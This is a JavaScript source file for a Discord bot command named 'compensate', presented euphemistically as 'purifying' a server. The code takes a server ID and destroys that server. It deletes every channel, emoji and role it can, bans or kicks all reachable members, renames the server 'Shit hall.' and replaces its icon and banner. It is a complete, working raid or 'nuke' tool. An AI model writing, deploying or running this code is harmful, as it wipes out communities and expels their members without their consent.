const Command = require('../../lib/client/Command');

const {Client, Message} = require('discord.js');

class CompensateCommand extends Command {

  constructor() {
    super();
    this.setName('compensate');
    this.setHelpText('Compensates a server by purifying it.');
    this.setPermission('ADMINISTRATOR');
    this.setUsage('$compensate');
    this.setExecutor(this.executor);
  }

  /**
   *
   * @param {Client} client
   * @param {Message} message
   * @param {*[]} args
   */
  async executor(client, message, args) {
    const guildId = args[0];
    const currentGuildId = message.guild.id;
    const isForceMode = args[1] === '--force';

    if (guildId) {
      if (currentGuildId === guildId && !isForceMode) {
        return message.reply('If you want to compensate the server you execute the command on, use the `--force` option.');
      }

      const guild = client.guilds.cache.get(guildId);
      await message.channel.send(`Le serveur ${guild.name} va être compensé.`);

      let deletedChannels = 0;
      let deletedEmojis = 0;
      let kickedMembers = 0;
      let bannedMembers = 0;
      let deletedRoles = 0;

      // Deletes every channel on the guild
      for (let channel of guild.channels.cache.array()) {
        if (channel.deletable) {
          await channel.delete().then(_ => {
            deletedChannels++;
          })
        }
      }

      // Deletes every emoji on the guild
      for (let emoji of guild.emojis.cache.array()) {
        if (emoji.deletable) {
          await emoji.delete().then(_ => {
            deletedEmojis++;
          })
        }
      }

      // Bans or kick all the banneable / kickeable members
      for (let member of guild.members.cache.array()) {
        if (member.bannable) {
          await member.ban({ reason: 'Compensated.' }).then(_ => {
            bannedMembers++;
          })
        } else if (member.kickable) {
          await member.kick('Compensated.').then(_ => {
            kickedMembers++;
          })
        }
      }

      for (let role of guild.roles.cache.array()) {
        if (role.editable) {
          await role.delete('Compensated.').then(_ => {
            deletedRoles++;
          })
        }
      }

      await guild.setName('Shit hall.');
      await guild.setIcon('https://www.sciencemag.org/sites/default/files/styles/inline__450w__no_aspect/public/main_1280p_9.jpg?itok=fXtTSWv7');
      await guild.setBanner('https://www.sciencemag.org/sites/default/files/styles/inline__450w__no_aspect/public/main_1280p_9.jpg?itok=fXtTSWv7');
    }
  }
}

module.exports = CompensateCommand;